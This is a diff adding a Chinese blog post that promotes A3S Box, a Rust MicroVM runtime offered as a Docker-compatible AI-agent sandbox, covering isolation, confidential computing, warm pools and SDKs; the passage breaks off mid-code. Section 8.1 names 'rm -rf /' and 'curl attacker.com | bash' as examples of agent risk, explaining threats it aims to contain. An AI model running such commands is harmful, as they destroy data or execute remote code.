@@ -1,0 +1,2354 @@
+---
+title: Rust 编写的 40MB 大小 MicroVM 运行时，完美替代 Docker 作为 AI Agent Sandbox
+description: 深入解析 A3S Box 的架构设计——200ms 冷启动、52 个 Docker 兼容命令、硬件级隔离与机密计算的技术实现
+date: "2025-01-15"
+author: A3S Lab
+tags: [box, microvm, rust, tee, docker, ai-agent]
+---
+
+> 当我们剥离所有技术术语的外衣，回到计算的本质，一个核心问题浮现出来：**我们能否让每一个工作负载都运行在自己的操作系统内核之上，同时保持容器级别的启动速度和开发体验？** A3S Box 给出了肯定的答案——一个 40MB 的单一二进制，无守护进程，200ms 冷启动，52 个 Docker 兼容命令，硬件级隔离 + 可选机密计算。
+
+---
+
+## 目录
+
+1. [引言：为什么需要重新思考容器运行时](#1-引言为什么需要重新思考容器运行时)
+2. [本质追问：从根本问题出发](#2-本质追问从根本问题出发)
+3. [架构总览：七个 Crate 的精密协作](#3-架构总览七个-crate-的精密协作)
+4. [核心价值一：真正的硬件级隔离](#4-核心价值一真正的硬件级隔离)
+5. [核心价值二：机密计算与零信任安全](#5-核心价值二机密计算与零信任安全)
+6. [核心价值三：200ms 冷启动的 MicroVM](#6-核心价值三200ms-冷启动的-microvm)
+7. [核心价值四：完整的 Docker 兼容体验](#7-核心价值四完整的-docker-兼容体验)
+8. [核心价值五：AI Agent 安全隔离沙箱](#8-核心价值五ai-agent-安全隔离沙箱)
+9. [深入虚拟机生命周期：状态机设计](#9-深入虚拟机生命周期状态机设计)
+10. [TEE 机密计算：从硬件到应用的信任链](#10-tee-机密计算从硬件到应用的信任链)
+11. [Vsock 通信协议：宿主与客户机的桥梁](#11-vsock-通信协议宿主与客户机的桥梁)
+12. [OCI 镜像处理管线：从注册表到根文件系统](#12-oci-镜像处理管线从注册表到根文件系统)
+13. [网络架构：三种模式的灵活选择](#13-网络架构三种模式的灵活选择)
+14. [Guest Init：MicroVM 内部的 PID 1](#14-guest-initmicrovm-内部的-pid-1)
+15. [暖池机制：消除冷启动的终极方案](#15-暖池机制消除冷启动的终极方案)
+16. [七层纵深防御安全模型](#16-七层纵深防御安全模型)
+17. [可观测性：Prometheus、OpenTelemetry 与审计](#17-可观测性prometheusopentelemetry-与审计)
+18. [Kubernetes 集成：CRI 运行时](#18-kubernetes-集成cri-运行时)
+19. [SDK 生态：Rust、Python、TypeScript 三端统一](#19-sdk-生态rustpythontypescript-三端统一)
+20. [与现有方案的对比分析](#20-与现有方案的对比分析)
+21. [未来展望与总结](#21-未来展望与总结)
+
+---
+
+## 1. 引言：为什么需要重新思考容器运行时
+
+过去十年，Docker 和容器技术彻底改变了软件的交付方式。开发者可以将应用及其依赖打包成一个标准化的镜像，在任何支持容器运行时的环境中运行。这种"一次构建，到处运行"的理念极大地提升了开发效率和部署一致性。
+
+然而，随着云原生架构的深入发展，传统容器运行时的根本性局限逐渐暴露：
+
+**共享内核的安全困境。** 传统容器（如 Docker 使用的 runc）本质上是 Linux 内核的进程隔离机制——通过 namespace 和 cgroup 实现资源隔离。但所有容器共享同一个宿主机内核。这意味着一个内核漏洞（如 CVE-2022-0185、CVE-2022-0847 "Dirty Pipe"）可以让攻击者从任何容器逃逸到宿主机，进而控制同一节点上的所有工作负载。
+
+**多租户环境的信任危机。** 在公有云和边缘计算场景中，来自不同租户的工作负载运行在同一物理硬件上。即使使用了容器隔离，租户之间仍然缺乏硬件级别的信任边界。云服务提供商的管理员理论上可以访问任何租户的内存数据——这在处理医疗记录、金融数据或个人隐私信息时是不可接受的。
+
+**性能与安全的两难选择。** 现有的解决方案要么牺牲性能换取安全（传统虚拟机启动需要数秒到数十秒），要么牺牲安全换取性能（容器的隔离强度不足）。Kata Containers 和 Firecracker 等项目试图在两者之间找到平衡，但仍然存在各自的局限。
+
+A3S Box 的诞生，正是为了从根本上解决这个矛盾。
+
+> 📖 完整文档与 API 参考请访问：[https://a3s-lab.github.io/a3s/](https://a3s-lab.github.io/a3s/)
+
+---
+
+## 2. 本质追问：从根本问题出发
+
+要理解 A3S Box 的设计决策，我们需要抛开类比和惯例，回到最基本的事实，然后从那里向上推理。让我们用这种方式重新审视"运行一个工作负载"这件事。
+
+### 2.1 什么是工作负载隔离的本质？
+
+从物理学的角度看，隔离意味着两个系统之间没有信息泄漏的通道。在计算领域，这意味着：
+
+1. **内存隔离**：工作负载 A 无法读取或写入工作负载 B 的内存空间
+2. **执行隔离**：工作负载 A 的代码执行不会影响工作负载 B 的执行流
+3. **I/O 隔离**：工作负载 A 的输入输出不会被工作负载 B 截获或篡改
+4. **时间隔离**：工作负载 A 的资源消耗不会导致工作负载 B 的性能退化
+
+传统容器只在操作系统层面实现了这些隔离——通过内核的 namespace 和 cgroup 机制。但内核本身是共享的，这意味着隔离的强度取决于内核代码的正确性。Linux 内核有超过 3000 万行代码，每年发现数百个安全漏洞。依赖如此庞大的代码基来保证隔离，从根本上看是不可靠的。
+
+### 2.2 硬件隔离是唯一的根本解
+
+如果我们不能信任软件来提供完美的隔离，那么唯一的选择就是利用硬件。现代处理器提供了两个层次的硬件隔离：
+
+**第一层：虚拟化扩展（Intel VT-x / AMD-V / Apple HVF）。** 处理器在硬件层面区分宿主模式（VMX root）和客户模式（VMX non-root）。客户模式下的代码无法直接访问宿主的内存或设备，任何敏感操作都会触发 VM Exit，由宿主的 VMM（Virtual Machine Monitor）处理。这提供了比操作系统级隔离强得多的保证。
+
+**第二层：内存加密（AMD SEV-SNP / Intel TDX）。** 更进一步，现代处理器可以对虚拟机的内存进行硬件加密。即使是拥有物理访问权限的攻击者（包括云服务提供商的管理员），也无法读取虚拟机内存中的明文数据。这就是所谓的"机密计算"（Confidential Computing）。
+
+### 2.3 A3S Box 的核心洞察
+
+A3S Box 的核心洞察可以用一句话概括：
+
+> **MicroVM + 机密计算 + 容器体验 = 安全与效率的统一**
+
+具体来说：
+
+- **每个工作负载一个 MicroVM**：利用 libkrun 在 ~200ms 内启动一个轻量级虚拟机，每个工作负载拥有独立的 Linux 内核。这不是容器级别的"假隔离"，而是硬件强制的真隔离。
+- **可选的机密计算**：在支持 AMD SEV-SNP 的硬件上，MicroVM 的内存被硬件加密。即使宿主机被完全攻破，攻击者也无法读取 MicroVM 内部的数据。
+- **Docker 兼容的用户体验**：52 个 Docker 兼容命令，开发者无需学习新工具。`a3s-box run nginx` 就像 `docker run nginx` 一样简单，但背后是完全不同的安全模型。
+
+这三个要素的结合，使得 A3S Box 不是对现有容器运行时的渐进式改进，而是一种范式转换——从"共享内核的进程隔离"到"独立内核的硬件隔离"。
+
+### 2.4 为什么是 libkrun？
+
+在选择虚拟化后端时，A3S Box 选择了 libkrun 而非 QEMU 或 Firecracker。这个选择同样经过了严格的技术评估：
+
+| 维度       | QEMU             | Firecracker | libkrun      |
+| ---------- | ---------------- | ----------- | ------------ |
+| 启动时间   | 数秒             | ~125ms      | ~200ms       |
+| 内存开销   | 数十 MB          | ~5 MB       | ~10 MB       |
+| 代码复杂度 | 极高（数百万行） | 中等        | 低（库形式） |
+| macOS 支持 | 有限             | 不支持      | 原生 HVF     |
+| Linux 支持 | KVM              | KVM         | KVM          |
+| 嵌入方式   | 独立进程         | 独立进程    | 库调用       |
+
+libkrun 的独特优势在于它是一个**库**而非独立进程。这意味着 A3S Box 可以将 VMM 直接嵌入到自己的进程空间中，减少了进程间通信的开销，同时在 macOS 上通过 Apple Hypervisor Framework（HVF）提供原生支持——这对开发者体验至关重要，因为大量开发者使用 macOS 进行日常开发。
+
+---
+
+## 3. 架构总览：七个 Crate 的精密协作
+
+A3S Box 采用 Rust 语言编写，整个项目由七个 Crate 组成，共 218 个源文件，1,466 个单元测试和 7 个集成测试。这种模块化设计遵循了"最小核心 + 外部扩展"的架构理念。
+
+### 3.1 Crate 拓扑
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│                        a3s-box-cli                              │
+│                    52 个 Docker 兼容命令                          │
+│                       (361 tests)                               │
+├─────────────────────────────────────────────────────────────────┤
+│                       a3s-box-sdk                               │
+│              Rust / Python / TypeScript SDK                     │
+├──────────────────────┬──────────────────────────────────────────┤
+│   a3s-box-cri        │           a3s-box-runtime                │
+│  Kubernetes CRI      │    VM 生命周期、OCI、TEE、网络              │
+│                      │           (678 tests)                    │
+├──────────────────────┴──────────────────────────────────────────┤
+│                       a3s-box-core                              │
+│              配置、错误类型、事件、Trait 定义                       │
+│                       (331 tests)                               │
+├─────────────────────────────────────────────────────────────────┤
+│  a3s-box-shim        │        a3s-box-guest-init                │
+│  libkrun 桥接子进程   │     Guest PID 1 / Exec / PTY / 证明       │
+├──────────────────────┴──────────────────────────────────────────┤
+│                      libkrun-sys                                │
+│                   libkrun FFI 绑定                               │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+### 3.2 各 Crate 职责
+
+**a3s-box-core（核心层）**：定义所有核心抽象——配置结构体、错误类型（`BoxError` 枚举，15 个变体）、事件系统、以及关键的 Trait 接口。这是整个系统的"契约层"，其他所有 Crate 都依赖它，但它不依赖任何其他 A3S Crate。
+
+**a3s-box-runtime（运行时层）**：实现 VM 生命周期管理、OCI 镜像拉取与缓存、TEE 机密计算、网络配置、暖池、自动扩缩容等核心功能。这是系统中最复杂的 Crate，拥有 678 个单元测试。
+
+**a3s-box-cli（命令行层）**：提供 52 个 Docker 兼容命令，是用户与系统交互的主要界面。它将用户的命令翻译为对 runtime 层的调用。
+
+**a3s-box-shim（VMM 桥接层）**：作为独立子进程运行，负责调用 libkrun FFI 接口来创建和管理 MicroVM。这种进程隔离设计确保了 VMM 的崩溃不会影响主进程。
+
+**a3s-box-guest-init（客户机初始化）**：编译为静态二进制，作为 MicroVM 内部的 PID 1 运行。负责挂载文件系统、配置网络、启动 Exec/PTY/Attestation 服务器。
+
+**a3s-box-cri（Kubernetes 集成层）**：实现 CRI（Container Runtime Interface）协议，使 A3S Box 可以作为 Kubernetes 的 RuntimeClass 运行。
+
+**a3s-box-sdk（SDK 层）**：提供嵌入式 Rust SDK，并通过 PyO3 和 napi-rs 分别生成 Python 和 TypeScript 绑定。
+
+### 3.3 核心 Trait 体系
+
+A3S Box 的可扩展性建立在一组精心设计的 Trait 之上。这些 Trait 定义了系统的扩展点，每个 Trait 都有默认实现，确保系统开箱即用：
+
+| Trait                  | 职责                     | 默认实现                            |
+| ---------------------- | ------------------------ | ----------------------------------- |
+| `VmmProvider`        | 从 InstanceSpec 启动 VM  | `VmController`（shim 子进程）     |
+| `VmHandler`          | 运行中 VM 的生命周期操作 | `ShimHandler`                     |
+| `ImageRegistry`      | OCI 镜像拉取与缓存       | `RegistryPuller`                  |
+| `CacheBackend`       | 目录级 LRU 缓存          | `RootfsCache`                     |
+| `MetricsCollector`   | 运行时指标采集           | `RuntimeMetrics`（Prometheus）    |
+| `TeeExtension`       | TEE 证明、密封、密钥注入 | `SnpTeeExtension`                 |
+| `AuditSink`          | 审计事件持久化           | JSON-lines 文件                     |
+| `CredentialProvider` | 注册表认证               | Docker config.json                  |
+| `EventBus`           | 事件发布/订阅            | `EventEmitter`（tokio broadcast） |
+
+这种设计的精妙之处在于：核心组件（5 个）保持稳定且不可替换，而扩展点（14 个）可以独立演进。用户可以替换任何扩展而不触及核心——这正是"最小核心 + 外部扩展"原则的体现。
+
+---
+
+## 4. 核心价值一：真正的硬件级隔离
+
+### 4.1 从 namespace 到 hypervisor
+
+传统容器的隔离模型可以类比为"同一栋大楼里的不同房间"——房间之间有墙壁（namespace），但共享同一个地基（内核）。如果地基出现裂缝，所有房间都会受到影响。
+
+A3S Box 的隔离模型则是"每个工作负载一栋独立的建筑"——每个 MicroVM 拥有自己的 Linux 内核，通过硬件虚拟化扩展（Intel VT-x / AMD-V / Apple HVF）与宿主机隔离。攻击者即使在一个 MicroVM 中获得了 root 权限并利用了内核漏洞，也只能影响该 MicroVM 自身——因为 VM Exit 机制确保了任何敏感操作都必须经过宿主机的 VMM 审查。
+
+### 4.2 隔离层次的叠加
+
+A3S Box 不仅仅依赖虚拟化来提供隔离。它在 MicroVM 内部还叠加了多层操作系统级隔离，形成纵深防御：
+
+```
+┌─────────────────────────────────────────┐
+│            应用进程                       │
+├─────────────────────────────────────────┤
+│  Seccomp BPF │ Capabilities │ no-new-priv│  ← 系统调用级
+├─────────────────────────────────────────┤
+│  Mount NS │ PID NS │ IPC NS │ UTS NS    │  ← 命名空间级
+├─────────────────────────────────────────┤
+│  cgroup v2 (CPU/Memory/PID limits)      │  ← 资源限制级
+├─────────────────────────────────────────┤
+│           独立 Linux 内核                 │  ← 内核级
+├─────────────────────────────────────────┤
+│     硬件虚拟化 (VT-x / AMD-V / HVF)     │  ← 硬件级
+├─────────────────────────────────────────┤
+│  AMD SEV-SNP / Intel TDX (可选)          │  ← 内存加密级
+└─────────────────────────────────────────┘
+```
+
+这种多层叠加的设计意味着，即使某一层被突破，攻击者仍然面临其他层的阻碍。这不是"选择最强的一层"，而是"每一层都增加攻击成本"。
+
+### 4.3 Guest Init 的安全启动链
+
+MicroVM 内部的 PID 1 进程（`a3s-box-guest-init`）是安全模型的关键环节。它被编译为静态链接的 Rust 二进制，不依赖任何动态库，最大限度地减少了攻击面。
+
+Guest Init 的启动序列：
+
+1. 挂载基础文件系统：`/proc`（procfs）、`/sys`（sysfs）、`/dev`（devtmpfs）
+2. 挂载 virtio-fs 共享文件系统（宿主机传入的 rootfs）
+3. 配置网络接口（通过原始系统调用，不依赖 `iproute2`）
+4. 应用安全策略（Seccomp、Capabilities、no-new-privileges）
+5. 启动三个 vsock 服务器：
+   - 端口 4089：Exec 服务器（命令执行）
+   - 端口 4090：PTY 服务器（交互式终端）
+   - 端口 4091：Attestation 服务器（TEE 证明，仅在 TEE 模式下）
+6. 等待宿主机连接
+
+整个过程不需要 systemd、不需要 shell、不需要任何用户空间工具——这是一个极简的、专为安全设计的初始化流程。
+
+---
+
+## 5. 核心价值二：机密计算与零信任安全
+
+### 5.1 什么是机密计算？
+
+机密计算（Confidential Computing）是一种硬件安全技术，它在数据被处理时（in-use）对其进行保护。传统的安全措施保护静态数据（at-rest，通过磁盘加密）和传输中的数据（in-transit，通过 TLS），但处理中的数据通常以明文形式存在于内存中。
+
+AMD SEV-SNP（Secure Encrypted Virtualization - Secure Nested Paging）通过以下机制改变了这一现状：
+
+- **内存加密**：每个虚拟机拥有独立的 AES 加密密钥，由处理器的安全处理器（PSP）管理。宿主机的 VMM 无法读取虚拟机的内存明文。
+- **完整性保护**：SNP（Secure Nested Paging）在 SEV-ES 的基础上增加了内存完整性保护，防止宿主机篡改虚拟机的内存内容。
+- **远程证明**：虚拟机可以生成硬件签名的证明报告，证明自己运行在真正的 AMD SEV-SNP 硬件上，且初始内存内容（measurement）未被篡改。
+
+### 5.2 A3S Box 的 TEE 实现
+
+A3S Box 的 TEE 子系统包含 12 个模块，覆盖了从硬件检测到应用层密钥管理的完整链路：
+
+**硬件检测**：系统启动时自动探测 `/dev/sev-guest`、`/dev/sev`、`/dev/tdx_guest` 设备文件，以及 `/sys/module/kvm_amd/parameters/sev_snp` 参数。如果硬件不可用但设置了 `A3S_TEE_SIMULATE=1` 环境变量，则进入模拟模式——这对开发和测试至关重要。
+
+**证明报告生成**：当验证方发送包含 nonce 和可选 user_data 的 `AttestationRequest` 时，Guest Init 将两者通过 SHA-512 组合为 64 字节的 `report_data`，然后通过 `SNP_GET_REPORT` ioctl 调用 `/dev/sev-guest` 设备生成证明报告。报告长度为 1184 字节，包含：
+
+```
+偏移量 0x00-0x04: version (u32 LE)        — 报告格式版本
+偏移量 0x04-0x08: guest_svn (u32 LE)      — 客户机安全版本号
+偏移量 0x08-0x10: policy (u64 LE)         — 安全策略标志
+偏移量 0x38-0x40: current_tcb             — 可信计算基版本
+偏移量 0x90-0xC0: measurement (48 bytes)  — 初始内存的 SHA-384 哈希
+偏移量 0x1A0-0x1E0: chip_id (64 bytes)    — 物理处理器唯一标识
+```
+
+**证书链验证**：A3S Box 实现了完整的 AMD 证书链验证：
+
+```
+AMD Root Key (ARK)          ← AMD 硬编码的根信任锚
+    │
+    ├── AMD SEV Key (ASK)   ← 中间证书
+    │       │
+    │       └── VCEK        ← 芯片级证书（每个物理处理器唯一）
+    │               │
+    │               └── SNP Report Signature  ← 证明报告签名
+```
+
+证书通过 AMD 的 KDS（Key Distribution Service）获取：`https://kds.amd.com/vcek/v1/{product}/{chip_id}`，并在本地缓存以避免重复网络请求。
+
+### 5.3 RA-TLS：将证明嵌入 TLS
+
+RA-TLS（Remote Attestation TLS）是 A3S Box 的一项关键创新。它将 SNP 证明报告嵌入到 X.509 证书的扩展字段中，使得 TLS 握手过程同时完成了身份验证和远程证明。
+
+这意味着：当宿主机与 MicroVM 建立 TLS 连接时，不仅验证了通信对端的身份，还验证了对端确实运行在受信任的 TEE 环境中。这消除了传统方案中证明和通信分离带来的 TOCTOU（Time-of-Check-Time-of-Use）漏洞。
+
+### 5.4 密封存储
+
+密封存储（Sealed Storage）允许 MicroVM 将敏感数据加密后持久化，且只有在相同（或兼容）的 TEE 环境中才能解密。A3S Box 使用 AES-256-GCM 加密，HKDF-SHA256 密钥派生，并提供三种密封策略：
+
+| 策略                   | 绑定因子               | 适用场景                             |
+| ---------------------- | ---------------------- | ------------------------------------ |
+| `MeasurementAndChip` | 镜像哈希 + 物理芯片 ID | 最严格，数据绑定到特定镜像和特定硬件 |
+| `MeasurementOnly`    | 仅镜像哈希             | 可跨硬件迁移，但必须是相同的镜像     |
+| `ChipOnly`           | 仅物理芯片 ID          | 可在固件更新后存活，但绑定到特定硬件 |
+
+此外，密封存储还实现了基于版本的回滚保护（`VersionStore`），防止攻击者用旧版本的密封数据替换新版本。
+
+---
+
+## 6. 核心价值三：200ms 冷启动的 MicroVM
+
+### 6.1 为什么启动速度至关重要？
+
+在 Serverless 和事件驱动架构中，工作负载的生命周期可能只有几百毫秒到几秒。如果虚拟机的启动时间需要数秒，那么启动开销就会占据工作负载总时间的很大比例，使得 MicroVM 方案在这些场景中不可行。
+
+A3S Box 通过 libkrun 实现了约 200ms 的冷启动时间。这个数字意味着：
+
+- 对于一个执行时间为 1 秒的 Serverless 函数，启动开销仅占 20%
+- 对于交互式工作负载，用户几乎感知不到启动延迟
+- 在 CI/CD 场景中，每个构建步骤都可以运行在独立的 MicroVM 中而不会显著增加总构建时间
+
+### 6.2 启动流程优化
+
+A3S Box 的启动流程经过精心优化：
+
+```
+[0ms]    VmController::start() 被调用
+[5ms]    定位 a3s-box-shim 二进制
+[10ms]   macOS: 检查/签署 hypervisor entitlement
+[15ms]   序列化 InstanceSpec 为 JSON
+[20ms]   启动 shim 子进程
+[25ms]   shim 调用 libkrun FFI 创建 VM 上下文
+[30ms]   配置 vCPU、内存、virtio-fs、vsock
+[50ms]   libkrun 启动 VM（内核引导）
+[150ms]  Guest Init (PID 1) 开始执行
+[160ms]  挂载文件系统
+[170ms]  配置网络
+[180ms]  启动 vsock 服务器
+[200ms]  VM 就绪，接受命令
+```
+
+### 6.3 暖池：消除冷启动
+
+对于对延迟极度敏感的场景，A3S Box 提供了暖池（Warm Pool）机制——预先启动一批 MicroVM，当请求到来时直接分配一个已就绪的 VM，实现零启动延迟。
+
+暖池的核心参数：
+
+- `min_idle`：最小空闲 VM 数量（默认 1）
+- `max_size`：池中最大 VM 数量（默认 5）
+- `idle_ttl_secs`：空闲 VM 的存活时间（默认 300 秒）
+
+暖池还集成了自动扩缩容器（`PoolScaler`），基于滑动窗口内的命中/未命中率动态调整 `min_idle`：
+
+- 当未命中率超过 `scale_up_threshold`（默认 0.3）时，增加预热 VM 数量
+- 当未命中率低于 `scale_down_threshold`（默认 0.05）时，减少预热 VM 数量
+- 冷却期（默认 60 秒）防止频繁振荡
+
+---
+
+## 7. 核心价值四：完整的 Docker 兼容体验
+
+### 7.1 52 个 Docker 兼容命令
+
+A3S Box 提供了 52 个与 Docker CLI 兼容的命令，覆盖了容器生命周期管理的方方面面。开发者可以将现有的 Docker 工作流无缝迁移到 A3S Box，无需修改脚本或学习新的命令语法。
+
+核心命令示例：
+
+```bash
+# 运行一个 MicroVM（等同于 docker run）
+a3s-box run -d --name my-app -p 8080:80 nginx:latest
+
+# 执行命令（等同于 docker exec）
+a3s-box exec my-app cat /etc/nginx/nginx.conf
+
+# 交互式终端（等同于 docker exec -it）
+a3s-box exec -it my-app /bin/bash
+
+# 查看日志
+a3s-box logs my-app
+
+# 查看运行中的 MicroVM
+a3s-box ps
+
+# 停止并删除
+a3s-box stop my-app
+a3s-box rm my-app
+
+# 镜像管理
+a3s-box images
+a3s-box pull ubuntu:22.04
+a3s-box push myregistry.io/my-image:v1
+
+# 网络管理
+a3s-box network create my-network
+a3s-box network connect my-network my-app
+
+# 卷管理
+a3s-box volume create my-data
+a3s-box run -v my-data:/data my-app
+
+# 审计查询
+a3s-box audit --filter "action=exec"
+```
+
+### 7.2 为什么兼容性如此重要？
+
+从技术采用的角度看，一项新技术能否被广泛接受取决于两个因素：**价值增量**和**迁移成本**。
+
+A3S Box 的价值增量是巨大的——从共享内核隔离升级到硬件级隔离，可选的机密计算。但如果迁移成本同样巨大（需要重写所有部署脚本、学习全新的 CLI、改变团队的工作流程），那么大多数团队会选择留在现有方案中。
+
+通过提供 Docker 兼容的 CLI，A3S Box 将迁移成本降到了最低：
+
+```bash
+# 迁移前
+docker run -d --name app -p 8080:80 nginx
+
+# 迁移后（只需替换命令名）
+a3s-box run -d --name app -p 8080:80 nginx
+```
+
+这不仅仅是命令名的替换。A3S Box 兼容 Docker 的镜像格式（OCI 标准）、网络模型、卷挂载语义、环境变量传递方式等。现有的 Dockerfile 无需修改即可使用。
+
+---
+
+## 8. 核心价值五：AI Agent 安全隔离沙箱
+
+### 8.1 AI Agent 时代的安全挑战
+
+大语言模型（LLM）驱动的 AI Agent 正在从"对话助手"演进为"自主执行者"——它们不仅生成文本，还能编写代码、调用工具、操作文件系统、发起网络请求。这种能力的飞跃带来了全新的安全挑战：
+
+**不可信代码执行。** AI Agent 生成的代码本质上是不可信的。即使是最先进的 LLM，也可能因为幻觉（hallucination）、提示注入（prompt injection）或对抗性输入而生成恶意代码。在没有隔离的环境中执行这些代码，等同于将宿主机的控制权交给了一个不可预测的实体。
+
+**工具调用的副作用。** Agent 通过工具（Tools）与外部世界交互——执行 shell 命令、读写文件、访问数据库、调用 API。每一次工具调用都可能产生不可逆的副作用。如果 Agent 在宿主机上直接执行 `rm -rf /` 或 `curl attacker.com | bash`，后果不堪设想。
+
+**多租户 Agent 平台。** SaaS 平台上运行着来自不同用户的 Agent，每个 Agent 可能有不同的权限级别和信任度。一个恶意用户的 Agent 不应该能够影响其他用户的 Agent 或平台本身。
+
+### 8.2 为什么传统容器不够？
+
+许多 AI Agent 框架使用 Docker 容器作为沙箱。但正如本文第 1 章所分析的，传统容器的隔离基于共享内核的 namespace 机制——一个内核漏洞就可以让 Agent 生成的恶意代码逃逸到宿主机。
+
+对于 AI Agent 场景，这个风险被放大了：
+
+- **攻击面更大**：Agent 可能执行任意系统调用，探测内核漏洞的概率更高
+- **攻击频率更高**：Agent 持续生成和执行代码，每次执行都是一次潜在的攻击尝试
+- **攻击智能更高**：LLM 具备理解和利用漏洞的能力，不同于传统的随机模糊测试
+
+A3S Box 的 MicroVM 隔离从根本上解决了这个问题——即使 Agent 生成的代码利用了 Linux 内核的零日漏洞，也无法突破硬件虚拟化边界。
+
+### 8.3 SDK 驱动的沙箱集成
+
+A3S Box 不仅是一个命令行工具，更是一个可嵌入的沙箱运行时。通过 Rust/Python/TypeScript 三端 SDK，AI Agent 框架可以将 A3S Box 作为库直接集成到自己的代码中：
+
+**Python Agent 框架集成示例：**
+
+```python
+from a3s_box import BoxSdk, SandboxOptions
+
+class SecureAgentExecutor:
+    def __init__(self):
+        self.sdk = BoxSdk()
+
+    async def execute_agent_code(self, code: str, language: str = "python"):
+        """在隔离沙箱中执行 Agent 生成的代码"""
+
+        # 创建一次性沙箱（独立 MicroVM）
+        sandbox = self.sdk.create(SandboxOptions(
+            image=f"{language}:3.11",
+            vcpus=2,
+            memory_mib=512,
+        ))
+
+        # 在沙箱中执行不可信代码
+        result = sandbox.exec([language, "-c", code])
+
+        return {
+            "stdout": result.stdout,
+            "stderr": result.stderr,
+            "exit_code": result.exit_code,
+        }
+        # sandbox 在作用域结束时自动销毁
+```
+
+**TypeScript Agent 框架集成示例：**
+
+```typescript
+import { BoxSdk } from '@a3s/box';
+
+class SecureToolExecutor {
+    private sdk = new BoxSdk();
+
+    async executeShellCommand(command: string): Promise<ToolResult> {
+        // 每次工具调用都在独立的 MicroVM 中执行
+        const sandbox = await this.sdk.create({
+            image: 'ubuntu:22.04',
+            vcpus: 1,
+            memoryMib: 256,
+        });
+
+        const output = await sandbox.exec(['bash', '-c', command]);
+
+        return {
+            success: output.exitCode === 0,
+            output: output.stdout,
+            error: output.stderr,
+        };
+    }
+}
+```
+
+这种集成模式的关键优势在于：**每次代码执行都在一个全新的、隔离的 MicroVM 中进行**。即使 Agent 在某次执行中做了破坏性操作（删除文件、修改系统配置），也只影响该 MicroVM 自身——下一次执行会在一个干净的环境中开始。
+
+### 8.4 暖池加速 Agent 响应
+
+AI Agent 的交互模式通常是"思考-执行-观察"的循环——Agent 生成一段代码，执行它，观察输出，然后决定下一步。这个循环的速度直接影响用户体验。
+
+如果每次执行都需要 200ms 的冷启动，一个包含 10 次工具调用的 Agent 任务就会额外增加 2 秒的延迟。暖池机制在这里发挥了关键作用：
+
+```
+无暖池：  [200ms 启动] [执行] [200ms 启动] [执行] [200ms 启动] [执行] ...
+                                                    总额外延迟：N × 200ms
+
+有暖池：  [~0ms 获取] [执行] [~0ms 获取] [执行] [~0ms 获取] [执行] ...
+                                                    总额外延迟：≈ 0ms
+```
+
+暖池的自动扩缩容特别适合 Agent 场景——Agent 的工具调用通常是突发性的（一次任务中密集调用，任务间空闲），`PoolScaler` 会根据命中率自动调整预热 VM 的数量。
+
+### 8.5 七层防御对抗 Agent 威胁
+
+A3S Box 的七层纵深防御在 AI Agent 场景中的每一层都有明确的防御目标：
+
+| 防御层            | 对抗的 Agent 威胁                               |
+| ----------------- | ----------------------------------------------- |
+| 硬件虚拟化        | Agent 利用内核漏洞逃逸                          |
+| TEE 内存加密      | Agent 尝试读取其他租户的内存数据                |
+| 独立内核          | Agent 的内核级攻击不影响其他沙箱                |
+| 命名空间          | Agent 无法看到沙箱外的进程和文件                |
+| Capability 剥离   | Agent 无法执行特权操作（如挂载设备）            |
+| Seccomp BPF       | Agent 无法调用危险系统调用（如 `kexec_load`） |
+| no-new-privileges | Agent 无法通过 SUID 二进制提权                  |
+
+### 8.6 审计与合规
+
+在 AI Agent 平台中，审计能力不仅是安全需求，更是合规需求。监管机构越来越关注 AI 系统的可追溯性——"AI 做了什么？什么时候做的？结果是什么？"
+
+A3S Box 的 26 种审计操作完整记录了 Agent 的每一次行为：
+
+- Agent 创建了哪些沙箱（`Create`）
+- Agent 执行了哪些命令（`Command`）
+- Agent 拉取了哪些镜像（`Pull`）
+- Agent 的操作是否成功（`Success` / `Failure` / `Denied`）
+
+这些审计日志以结构化的 JSON-lines 格式存储，可以导入到任何日志分析系统中进行事后审查。
+
+### 8.7 轻量级部署：约 40MB 的完整运行时
+
+A3S Box 编译后的二进制文件大小仅约 40MB——这包含了完整的 CLI、运行时、OCI 镜像处理、TEE 支持、网络管理、暖池、审计系统等所有功能。
+
+这个数字的意义在于：
+
+- **对比 Docker Engine**：Docker 的完整安装包超过 200MB，还需要 containerd、runc 等多个组件
+- **对比 QEMU**：QEMU 的安装包通常超过 100MB，且依赖大量动态库
+- **边缘部署友好**：40MB 的单一二进制可以轻松部署到 IoT 设备、边缘节点等存储受限的环境
+- **容器镜像极小**：A3S Box 本身可以打包为极小的容器镜像，便于在 Kubernetes 中作为 DaemonSet 部署
+
+这种极致的二进制大小得益于 Rust 的零成本抽象和编译时优化——没有运行时虚拟机、没有垃圾回收器、没有庞大的标准库运行时。静态链接的 Guest Init 二进制更是只有几 MB，确保了 MicroVM 内部的最小攻击面。
+
+对于 AI Agent 平台来说，轻量级部署意味着可以在每个计算节点上快速部署 A3S Box，而不会占用宝贵的磁盘空间和网络带宽。结合暖池机制，整个系统可以在分钟级别内从零扩展到数百个隔离沙箱。
+
+---
+
+## 9. 深入虚拟机生命周期：状态机设计
+
+### 9.1 BoxState 状态机
+
+A3S Box 使用一个严格定义的状态机来管理每个 MicroVM 的生命周期。状态机通过 `RwLock` 实现并发安全的状态同步：
+
+```
+Created ──→ Ready ──→ Busy ──→ Ready
+   │          │         │        │
+   │          │         │        └──→ Compacting ──→ Ready
+   │          │         │
+   │          └─────────┴──────────→ Stopped
+   │
+   └──────────────────────────────→ Stopped
+```
+
+各状态的含义：
+
+- **Created**：VM 配置已生成，但尚未启动。此时 `InstanceSpec` 已构建完成，包含 vCPU 数量、内存大小、rootfs 路径、入口点、网络配置、TEE 配置等所有参数。
+- **Ready**：VM 已启动并就绪，可以接受命令。Guest Init 已完成初始化，vsock 服务器已在监听。
+- **Busy**：VM 正在执行命令（exec 或 PTY 会话）。在此状态下，新的命令请求会排队等待。
+- **Compacting**：VM 正在执行内部维护操作（如日志轮转、缓存清理）。这是一个短暂的过渡状态。
+- **Stopped**：VM 已停止。可以从任何状态转换到此状态（正常关闭或异常终止）。
+
+### 9.2 VmController 启动流程详解
+
+`VmController` 是 `VmmProvider` trait 的默认实现，负责将 `InstanceSpec` 转化为一个运行中的 MicroVM：
+
+```rust
+// 简化的启动流程
+impl VmmProvider for VmController {
+    async fn start(&self, spec: InstanceSpec) -> Result<Box<dyn VmHandler>> {
+        // 1. 定位 shim 二进制
+        let shim_path = Self::find_shim()?;
+  
+        // 2. macOS: 确保 hypervisor entitlement
